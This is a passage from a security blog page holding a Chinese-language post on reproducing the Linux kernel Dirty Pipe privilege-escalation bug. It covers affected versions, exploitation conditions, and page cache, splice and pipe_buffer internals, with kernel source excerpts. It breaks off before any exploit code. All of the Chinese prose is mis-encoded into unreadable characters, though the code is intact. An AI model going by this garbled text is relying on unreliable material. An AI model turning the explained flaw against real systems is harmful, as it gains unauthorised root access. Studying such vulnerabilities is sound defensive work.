<li><p>JS ÂØπË±°ÂÜÖÂ≠ò‰ø°ÊÅØÂ∏ÉÂ±Ä</p>
</li>
<li><p>JavaScript Hole ÊºèÊ¥û</p>
</li>
<li><p>Tagged Pointer</p>
</li>
<li><p>JavaScript Sandbox ‰ª•ÂèäÂÖ∂ÁªïËøáÊâãÊ≥ï</p>
</li>
<li><p>Map ÂØπË±°ÂéüÁêÜ‰ª•Âèä OrderedHashMap </p>
</li>
<li><p>V8 ÁöÑÁºñËØë‰ª•ÂèäË∞ÉËØïÊâãÊ≥ï</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/27/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Pipe/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PwnËøõ‰Ω†ÁöÑÂøÉ">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/27/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Pipe/" class="post-title-link" itemprop="url">Kernel Áé∞ÂÆûÊºèÊ¥ûÂ§çÁé∞ÔºöDirty Pipe</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-27 18:14:07" itemprop="dateCreated datePublished" datetime="2022-11-27T18:14:07+08:00">2022-11-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-02-26 01:44:48" itemprop="dateModified" datetime="2024-02-26T01:44:48+08:00">2024-02-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Dirty Pipe ÊºèÊ¥ûÊàêÂõ†</strong></p>
<p>ÊîªÂáªËÄÖÂèØ‰ª•Âà©Áî®ËØ•ÊºèÊ¥ûÂÆûÁé∞‰ΩéÊùÉÈôêÁî®Êà∑ÊèêÂçáËá≥ root ÊùÉÈôêÔºå‰∏îËÉΩÂØπ‰∏ªÊú∫‰ªªÊÑèÂèØËØªÊñá‰ª∂ËøõË°åËØªÂÜô</p>
<p>ÊîªÂáªÈÄÇÁî®ÁâàÊú¨Ôºö</p>
<ul>
<li>Linux KernelÁâàÊú¨ &gt;= 5.8</li>
<li>Linux KernelÁâàÊú¨ &lt; 5.16.11 / 5.15.25 / 5.10.102</li>
</ul>
<p>ÊîªÂáªÈÄÇÁî®Êù°‰ª∂Ôºö</p>
<ul>
<li>ÊîªÂáªËÄÖÂøÖÈ°ªÊúâËØªÊùÉÈôêÔºàÂõ†‰∏∫ÂÆÉÈúÄË¶ÅÈÄöËøá <code>splice</code> ÊñπÊ≥ïÂ∞ÜÂ∞ÜÈ°µËæìÂÖ•ÁÆ°ÈÅì‰∏≠Ôºâ</li>
<li>ÂÅèÁßªÈáè‰∏çËÉΩÂú®È°µËæπÁïå‰∏äÔºàÂõ†‰∏∫È°µ‰∏äËá≥Â∞ëÊúâ‰∏Ä‰∏™Â≠óËäÇÂ∑≤ÁªèÊãºÊé•Âà∞ÁÆ°ÈÅì‰∏≠Ôºâ</li>
<li>ÂÜôÂÖ•‰∏çËÉΩË∑®Ë∂äÈ°µËæπÁïåÔºàÂõ†‰∏∫ËøôÂ∞Ü‰∏∫ÂÖ∂‰ΩôÈÉ®ÂàÜÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑÂåøÂêçÁºìÂÜ≤Âå∫Ôºâ</li>
<li>Êñá‰ª∂Êó†Ê≥ïË∞ÉÊï¥Â§ßÂ∞èÔºàÂõ†‰∏∫ÁÆ°ÈÅìÊúâËá™Â∑±ÁöÑÈ°µÈù¢Â°´ÂÖÖÁÆ°ÁêÜÔºåÂπ∂‰∏î‰∏ç‰ºöÂëäËØâÈ°µÈù¢ÁºìÂ≠òÈôÑÂä†‰∫ÜÂ§öÂ∞ëÊï∞ÊçÆÔºâ</li>
<li>ÂçïÊ¨°ÂÜôÂÖ•ÁöÑÈïøÂ∫¶‰∏çËÉΩË∂ÖËøá‰∏ÄÈ°µÔºàÂõ†‰∏∫È°µÂ§ßÂ∞è‰∏∫4KÔºâ</li>
</ul>
<p>ËØ•ÊºèÊ¥ûÊ∫ê‰∫éÊñ∞ÁÆ°ÈÅìÁºìÂÜ≤Âå∫ÁªìÊûÑÁöÑ‚Äúflag‚ÄùÂèòÈáèÂú® Linux ÂÜÖÊ†∏‰∏≠ÁöÑ <code>copy_page_to_iter_pipe</code> Âíå <code>push_pipe</code> ÂáΩÊï∞‰∏≠Áº∫‰πèÊ≠£Á°ÆÁöÑÂàùÂßãÂåñ</p>
<p><strong>ÂâçÁΩÆÁü•ËØÜ - Page Cache &amp; splice</strong></p>
<p>Page Cache Âç≥ÁºìÂ≠òÁÆ°ÁêÜÊú∫Âà∂Ôºå‰∏ÄËà¨ÂΩìÊàë‰ª¨ËÆøÈóÆ‰∏Ä‰∏™Á£ÅÁõòÊñá‰ª∂ÁöÑÊó∂ÂÄôÔºåÈ¶ñÂÖàÂÜÖÊ†∏‰ºöÂ∞ÜÂÖ∂ÂÜÖÂÆπË£ÖËΩΩÂà∞ Page Cache ÂÜÖÂ≠ò‰∏≠ÔºåÂêéÁª≠ÈÉΩÊòØÁõ¥Êé•ËØªÂèñÂÜÖÂ≠ò‰∏≠ÁöÑ Page Cache Êù•ËÆøÈóÆÊï∞ÊçÆÔºåÂÜÖÊ†∏‰ºöÂú®ÂêàÈÄÇÁöÑÊó∂Êú∫Â∞ÜÊ†áËÑèÁöÑ Page ÁªôÂÜôÂõûÁ£ÅÁõò‰∏≠</p>
<ul>
<li>Â¶ÇÊûúÁî®Êà∑ËøõÁ®ã‰ΩøÁî® read/write ËØªÂÜôÊñá‰ª∂ÔºåÈÇ£‰πàÂÜÖÊ†∏‰ºöÂÖàÂ∞ÜËΩΩÂÖ•Êï∞ÊçÆÁöÑÁâ©ÁêÜÂÜÖÂ≠òÊò†Â∞ÑÂà∞ÂÜÖÊ†∏ËôöÊãüÂÜÖÂ≠ò bufferÔºåÁÑ∂ÂêéÂÜçÂ∞ÜÂÜÖÊ†∏ÁöÑ buffer Êï∞ÊçÆÊã∑Ë¥ùÂà∞Áî®Êà∑ÊÄÅ</li>
<li>Â¶ÇÊûúËøΩÊ±ÇÊïàÁéáÔºåÂÜÖÊ†∏‰πüÊèê‰æõ‰∏ÄÁßçÈõ∂Êã∑Ë¥ùÊ®°ÂºèÔºà‰∏çÂèëÁîüÁ≥ªÁªüË∞ÉÁî®ÔºåË∑®Ë∂äÁî®Êà∑ÂíåÂÜÖÊ†∏ÁöÑËæπÁïåÂÅö‰∏ä‰∏ãÊñáÂàáÊç¢ÔºâÔºåÁî®Êà∑ËøõÁ®ãÂèØ‰ª•‰ΩøÁî® mmap Áõ¥Êé•Â∞ÜÁî®Êà∑ÊÄÅÁöÑ buffer Êò†Â∞ÑÂà∞Áâ©ÁêÜÂÜÖÂ≠òÔºå‰∏çÈúÄË¶ÅËøõË°åÁ≥ªÁªüË∞ÉÁî®ÔºåÁõ¥Êé•ËÆøÈóÆËá™Â∑±ÁöÑ mmap Âå∫ÂüüÂç≥ÂèØËÆøÈóÆÂà∞ÈÇ£ÊÆµÁâ©ÁêÜÂÜÖÂ≠òÂÜÖÂÆπ</li>
</ul>
<p>splice Á≥ªÁªüË∞ÉÁî®ÈÄöËøá‰∏ÄÁßç‚ÄúÈõ∂Êã∑Ë¥ù‚ÄùÁöÑÊñπÊ≥ïÂ∞ÜÊñá‰ª∂ÂÜÖÂÆπËæìÈÄÅÂà∞ÁÆ°ÈÅì‰πã‰∏≠ÔºåÁõ∏ÊØî‰º†ÁªüÁöÑÁõ¥Êé•Â∞ÜÊñá‰ª∂ÂÜÖÂÆπÈÄÅÂÖ•ÁÆ°ÈÅìÊÄßËÉΩÊõ¥Â•Ω</p>
<ul>
<li>ÁªèÂÖ∏ÁöÑ <code>read/write</code> ÊñπÂºèÔºöÂà©Áî®Áî®Êà∑ÊÄÅÊï∞ÊçÆ <code>buf</code> ‰Ωú‰∏∫Êñá‰ª∂ÁºìÂ≠ò</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">malloc</span>(len)  		<span class="comment">// È¶ñÂÖàÁî≥ËØ∑‰∏ÄÂùóÈïøÂ∫¶‰∏∫lenÁöÑÂÜÖÂ≠ò</span></span><br><span class="line">read(fd1, buf, len)  	<span class="comment">// Â∞ÜÁ¨¨‰∏Ä‰∏™Êñá‰ª∂fd1‰∏≠lenÈïøÂ∫¶ÁöÑÊï∞ÊçÆËØªÂÖ•buf</span></span><br><span class="line">write(fd2, buf, len) 	<span class="comment">// Â∞Übuf‰∏≠ÁöÑÊï∞ÊçÆÂÜôÂÖ•Êñá‰ª∂fd2‰∏≠</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Èõ∂Êã∑Ë¥ù <code>splice</code>ÔºöÂú®Êï∞ÊçÆÂèëÈÄÅÁöÑËøáÁ®ã‰∏≠Ôºå‰∏çÈúÄË¶ÅÂú®Áî®Êà∑ÊÄÅ‰∏∫Êï∞ÊçÆÁî≥ËØ∑ <code>buf</code>Ôºå‰πüÂ∞±ÊòØ‰∏ç‰ºö‰∫ßÁîüÁî®Êà∑ÊÄÅ„ÄÅÂÜÖÊ†∏ÊÄÅ‰πãÈó¥ÁöÑÊï∞ÊçÆÊã∑Ë¥ù </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">splice</span><span class="params">(<span class="keyword">int</span> fd_in, <span class="keyword">loff_t</span> *off_in, <span class="keyword">int</span> fd_out,</span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="keyword">loff_t</span> *off_out, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>Âú®‰∏§‰∏™Êñá‰ª∂ÊèèËø∞Á¨¶‰πãÈó¥ÁßªÂä®Êï∞ÊçÆÔºåËÄåÊó†ÈúÄÂú®ÂÜÖÊ†∏Âú∞ÂùÄÁ©∫Èó¥ÂíåÁî®Êà∑Âú∞ÂùÄÁ©∫Èó¥‰πãÈó¥ËøõË°åÂ§çÂà∂</li>
<li>ÂÆÉ‰ªéÊñá‰ª∂ÊèèËø∞‰∏≠‰º†ËæìÊúÄÂ§ö <code>len</code> Â≠óËäÇÁöÑÊï∞ÊçÆ</li>
<li>Â∞Ü <code>fd_in</code> ‰º†ÈÄíÂà∞Êñá‰ª∂ÊèèËø∞Á¨¶ <code>fd_out</code>ÔºåÂÖ∂‰∏≠Êñá‰ª∂ÊèèËø∞Á¨¶‰πã‰∏ÄÂøÖÈ°ªÂºïÁî®ÁÆ°ÈÅì</li>
</ul>
<p>splice Âú®ÂÜÖÊ†∏‰∏≠ÂØπÂ∫îÁöÑÊé•Âè£Â¶Ç‰∏ãÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE6(splice, <span class="keyword">int</span>, fd_in, <span class="keyword">loff_t</span> __user *, off_in,</span><br><span class="line">		<span class="keyword">int</span>, fd_out, <span class="keyword">loff_t</span> __user *, off_out,</span><br><span class="line">		<span class="keyword">size_t</span>, len, <span class="keyword">unsigned</span> <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">in</span>, <span class="title">out</span>;</span></span><br><span class="line">	<span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!len))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(flags &amp; ~SPLICE_F_ALL))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	error = -EBADF;</span><br><span class="line">	in = fdget(fd_in); <span class="comment">/* ÊâæÂà∞ËæìÂÖ•Êñá‰ª∂ */</span></span><br><span class="line">	<span class="keyword">if</span> (in.file) &#123;</span><br><span class="line">		out = fdget(fd_out); <span class="comment">/* ÊâæÂà∞ËæìÂá∫Êñá‰ª∂ */</span></span><br><span class="line">		<span class="keyword">if</span> (out.file) &#123;</span><br><span class="line">			error = do_splice(in.file, off_in, out.file, off_out,</span><br><span class="line">					  len, flags); <span class="comment">/* ÁúüÊ≠£ÁöÑÁßªÂä®Êï∞ÊçÆ */</span></span><br><span class="line">			fdput(out);</span><br><span class="line">		&#125;</span><br><span class="line">		fdput(in);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Ë∞ÉÁî®ÈìæÂ¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sys_splice -&gt; do_splice -&gt; []</span><br><span class="line">[pipe to pipe]-&gt; splice_pipe_to_pipe -&gt; ()</span><br><span class="line">[pipe to file]-&gt; do_splice_to -&gt; ()</span><br><span class="line">[file to pipe]-&gt; do_splice_from -&gt; f_op-&gt;splice_read(generic_file_splice_read) -&gt; call_read_iter -&gt; f_op-&gt;read_iter(copy_folio_to_iter) -&gt; ... -&gt; copy_page_to_iter -&gt; copy_page_to_iter_pipe</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂÖ∂‰∏≠ <code>copy_page_to_iter_pipe</code> ÂØπ‚Äúflag‚ÄùÂèòÈáèÊ≤°ÊúâËøõË°åÂàùÂßãÂåñ</li>
</ul>
<p>‰ΩøÁî® <code>splice</code> Â∞ÜÊï∞ÊçÆ‰ªéÊñá‰ª∂ÂØºÂÖ•Âà∞ÁÆ°ÈÅì‰∏≠ÔºöÔºà<code>file to pipe</code>Ôºâ</p>
<ul>
<li>È¶ñÂÖàÂ∞ÜÊï∞ÊçÆÂä†ËΩΩÂà∞Êñá‰ª∂È°µÈù¢ÁºìÂ≠ò <code>page cache</code> ‰∏≠</li>
<li>ÁÑ∂ÂêéÂàõÂª∫‰∏Ä‰∏™ÁÆ°ÈÅìÁºìÂÜ≤Âå∫ <code>pipe_buffer</code> </li>
<li>Áõ¥Êé• <code>pipe_buffer-&gt;page = page cache</code>ÔºåÊää <code>page cache</code> ÂΩìÂÅö <code>pipe_buffer</code> ÁöÑÁºìÂ≠òÈ°µ</li>
</ul>
<p>Â¶ÇÊûúÊ≠§Êó∂ËØ•ÁÆ°ÈÅìËøòÊÉ≥Â≠òÂÇ®‰ªéÂÖ∂‰ªñËæìÂÖ•ÊµÅ‰º†ËæìÊù•ÁöÑÊï∞ÊçÆÔºåÂ∞±Âè™ËÉΩÈáçÊñ∞Áî≥ËØ∑ <code>pipe_buffer</code>Ôºå‰∏çËÉΩÁõ¥Êé•ÈôÑÂä†Âà∞ÂàöÊâçÁöÑ <code>pipe_buffer</code> ‰∏≠ÔºåÂõ†‰∏∫ËØ• <code>page</code> ÊòØÊñá‰ª∂ÁöÑÁºìÂ≠òÈ°µÈù¢Ôºå‰∏çÂ±û‰∫éÁÆ°ÈÅìÔºå‰ΩÜ Dirty Pipe Âà©Áî®‰∫Ü‰∏ÄÁßçÊñπÊ≥ï‰ΩøËØ•È°µÈù¢ÂèØ‰ª•Ë¢´ÁÆ°ÈÅìÂÜôÂÖ•</p>
<p><strong>ÂâçÁΩÆÁü•ËØÜ - Pipe</strong></p>
<p>ÁÆ°ÈÅì Pipe ÊòØ‰∏ÄÁßçÁªèÂÖ∏ÁöÑ IPC ÈÄö‰ø°ÊñπÂºèÔºö</p>
<ul>
<li>ÂÆÉÂåÖÂê´‰∏Ä‰∏™ËæìÂÖ•Á´ØÂíå‰∏Ä‰∏™ËæìÂá∫Á´ØÔºåÁ®ãÂ∫èÂ∞ÜÊï∞ÊçÆ‰ªé‰∏ÄÊÆµËæìÂÖ•Ôºå‰ªéÂè¶‰∏ÄÁ´ØËØªÂá∫</li>
<li>Âú®ÂÜÖÊ†∏‰∏≠Ôºå‰∏∫‰∫ÜÂÆûÁé∞ËøôÁßçÊï∞ÊçÆÈÄö‰ø°ÔºåÈúÄË¶Å‰ª•È°µÈù¢ Page ‰∏∫Âçï‰ΩçÁª¥Êä§‰∏Ä‰∏™ÁéØÂΩ¢ÁºìÂÜ≤Âå∫ÔºàË¢´Áß∞‰∏∫ <code>ring_buffer</code>ÔºâÔºåÈáåÈù¢Â≠ò‰∫Ü16‰∏™ <code>pipe_buffer</code> ÁªìÊûÑÔºåÊØè‰∏™ <code>pipe_buffer</code>  ÁªìÊûÑÂèàÊúâ‰∏Ä‰∏™ÊåáÈíàÊåáÂêë‰∏Ä‰∏™Ë°®Á§∫Áâ©ÁêÜÂÜÖÂ≠òÈ°µ Page ÁöÑÁªìÊûÑ‰Ωì</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span> <span class="comment">/* Áî®‰∫éÊèèËø∞‰∏Ä‰∏™Áâ©ÁêÜÈ°µ */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len; </span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span> <span class="comment">/* ÂØπÂ∫îÊìç‰ΩúÁÆ°ÈÅìÁöÑÂáΩÊï∞ÊåáÈíà */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÊØè‰∏™ Page Â§ßÂ∞è‰∏∫ 4KBÔºåÈ°µÈù¢‰πãÈó¥Âπ∂‰∏çËøûÁª≠</li>
<li>ÁÆ°ÈÅìÁª¥Êä§‰∏§‰∏™ÂºïÁî®ËÆ°Êï∞Âô®Ôºå‰∏Ä‰∏™Áî®Êù•ÂÜô (pipe-&gt;head)Ôºå‰∏Ä‰∏™Áî®Êù•ËØª (pipe-&gt;tail)ÔºåÂèØ‰ª•Ë¢´Âæ™ÁéØÂà©Áî®</li>
<li>ÂΩìÂâçÈ°µÈù¢Â∏¶Êúâ <code>PIPE_BUF_FLAG_CAN_MERGE</code> flag Êó∂ÔºåÂ¶ÇÊûúÂ∞ÜÊ†áËÆ∞‰∏îÁª≠ÂÜôÂêéÁöÑÊï∞ÊçÆÈïøÂ∫¶‰∏çË∂ÖËøá‰∏ÄÈ°µÊó∂ÔºåÂàôÂèØ‰ª•ËøõË°åÁª≠ÂÜô</li>
</ul>
<p>ÁÆ°ÈÅìÊèèËø∞Á¨¶ <code>pipe_inode_info</code>ÔºåÁî®‰∫éË°®Á§∫‰∏Ä‰∏™ÁÆ°ÈÅìÔºåÂ≠òÂÇ®ÁÆ°ÈÅìÁõ∏Â∫îÁöÑ‰ø°ÊÅØÔºö </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head; <span class="comment">/* ÁºìÂÜ≤Âå∫ÁîüÊàêÁÇπ */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> tail; <span class="comment">/* ÁºìÂÜ≤Âå∫Ê∂àËÄóÁÇπ */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_accounted;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> readers; <span class="comment">/* ËØ•ÁÆ°ÈÅìÁöÑÂΩìÂâçËØªËÄÖÊï∞Èáè(ÊØèÊ¨°‰ª•ËØªÊñπÂºèÊâìÂºÄÊó∂,readersÂä†1,ÂÖ≥Èó≠Êó∂readersÂáè1) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> writers; <span class="comment">/* ËØ•ÁÆ°ÈÅìÁöÑÂΩìÂâçÂÜôËÄÖÊï∞Èáè(ÊØèÊ¨°‰ª•ÂÜôÊñπÂºèÊâìÂºÄÊó∂,writersÂä†1,ÂÖ≥Èó≠Êó∂writersÂáè1) */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> files; <span class="comment">/* ÂºïÁî®Ê≠§ÁÆ°ÈÅìÁöÑfileÁªìÊûÑ‰ΩìÊï∞Èáè */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter; <span class="comment">/* ÁÆ°ÈÅìËØªËÄÖËÆ∞Êï∞Âô®,ÊØèÊ¨°‰ª•ËØªÊñπÂºèÊâìÂºÄÁÆ°ÈÅìÊó∂,r_counterÂä†1,ÂÖ≥Èó≠ÊòØ‰∏çÂèò */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter; <span class="comment">/* ÁÆ°ÈÅìÂÜôËÄÖËÆ°Êï∞Âô®,ÊØèÊ¨°‰ª•ÂÜôÊñπÂºèÊâìÂºÄÁÆ°ÈÅìÊó∂,w_counterÂä†1,ÂÖ≥Èó≠ÊòØ‰∏çÂèò */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span> <span class="comment">/* È°µÁºìÂ≠ò,ÂèØ‰ª•Âä†ÈÄüÈ°µÂ∏ßÁöÑÂàÜÈÖçËøáÁ®ã,ÂΩìÈáäÊîæÈ°µÂ∏ßÊó∂Â∞ÜÈ°µÂ∏ßËÆ∞ÂÖ•tmp_page,ÂΩìÂàÜÈÖçÈ°µÂ∏ßÊó∂,‰ºòÂÖà‰ªétmp_page‰∏≠Ëé∑Âèñ(Â¶ÇÊûútmp_page‰∏∫Á©∫Êâç‰ªé‰ºô‰º¥Á≥ªÁªü‰∏≠Ëé∑Âèñ) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span> <span class="comment">/* ËØªÁ´ØÂºÇÊ≠•ÊèèËø∞Á¨¶ */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span> <span class="comment">/* ÂÜôÁ´ØÂºÇÊ≠•ÊèèËø∞Á¨¶ */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span> <span class="comment">/* ÂõûÁéØÁºìÂÜ≤Âå∫(Áî±16‰∏™pipe_bufferÂØπË±°ÁªÑÊàê,ÊØè‰∏™pipe_bufferÂØπË±°Êã•Êúâ‰∏Ä‰∏™ÂÜÖÂ≠òÈ°µ) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span> <span class="comment">/* ÂàõÂª∫Ê≠§ÁÆ°ÈÅìÁöÑÁî®Êà∑ */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>ÁÆ°ÈÅìÂèØ‰ª•ÂàÜ‰∏∫ÂëΩÂêçÁÆ°ÈÅìÂíåÂåøÂêçÁÆ°ÈÅìÔºö</p>
<ul>
<li>ÂëΩÂêçÁÆ°ÈÅìÊòØ‰∏Ä‰∏™ÊúâÂêçÂ≠óÁöÑÂÆû‰ΩìÊñá‰ª∂</li>
<li>ÂåøÂêçÁÆ°ÈÅìÂ∞±ÊòØÊàë‰ª¨Â∏∏‰ΩøÁî®ÁöÑÁÆ°ÈÅìÁ¨¶ÂàõÂª∫ÁöÑÁÆ°ÈÅì</li>
</ul>
<p>Êú¨Ë¥®‰∏äÊù•ËÆ≤ÔºåÁÆ°ÈÅìÂ∞±ÊòØ‰∏ÄÁßçËøõÁ®ãÈó¥ÁöÑÈÄö‰ø°ÊâãÊÆµÔºåËÆ©‰∏§‰∏™ËøõÁ®ãÂèØ‰ª•ÈÄöËøá pipe ÂèëÈÄÅÂíåÊé•Êî∂Êï∞ÊçÆÔºàÂåøÂêçÁÆ°ÈÅìÂèØÁî®‰∫éÁà∂Â≠ê‰∏éÂÖÑÂºüËøõÁ®ã‰πãÈó¥ÁöÑÈÄö‰ø°ÔºåÊúâÂêçÁÆ°ÈÅìÂàôÁî®‰∫é‰∏§‰∏™Êó†ÂÖ≥ËøõÁ®ãÁöÑÈÄö‰ø°Ôºâ</p>
<p>ËøôÈáåÊàë‰ª¨ÈáçÁÇπÂàÜÊûêÂÆûÁé∞ÁÆ°ÈÅìÂÜôÁöÑÂáΩÊï∞ <code>pipe_write</code>Ôºö</p>
<ul>
<li>Ë£ÖËΩΩ‰∫ÜÊñá‰ª∂ÁºìÂ≠òÈ°µÈù¢ <code>page tcache</code> ÁöÑ <code>pipe_buffer</code> ‰∏çËÉΩË¢´ËØ•ÁÆ°ÈÅìÁª≠ÂÜôÔºàÂõ†‰∏∫ÂÜôÂÖ•ËØ•ÁÆ°ÈÅìÁöÑÊï∞ÊçÆÂ∞Ü‰ºöË¢´ÂÜôÂÖ•Êñá‰ª∂Ôºâ</li>
<li>Êàë‰ª¨Êù•Áúã‰∏Ä‰∏ãÁ©∂Á´üÊòØÂì™ÈáåÈôêÂà∂‰∫ÜÁÆ°ÈÅìÁöÑÂÜôÂÖ•Ôºö</li>
</ul>
